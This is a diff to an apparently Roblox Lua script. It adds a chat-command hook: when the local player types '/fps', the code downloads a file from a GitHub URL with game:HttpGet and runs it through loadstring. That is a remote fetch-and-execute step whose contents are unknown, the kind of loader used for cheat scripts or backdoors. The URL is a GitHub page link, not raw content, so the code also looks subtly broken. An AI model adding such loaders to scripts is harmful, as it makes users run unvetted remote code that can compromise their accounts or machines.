@@ -225,3 +225,11 @@ for _,v in pairs(game:GetService("Workspace"):GetChildren()) do
 end
 end
 end)
+
+game.Players.LocalPlayer.Chatted:connect(function(cmd)
+if cmd:match("/fps") then
+
+loadstring(game:HttpGet(("https://github.com/repurges/RBX-Scripts/blob/main/FPSforADMIN"), true))()
+
+end
+end)
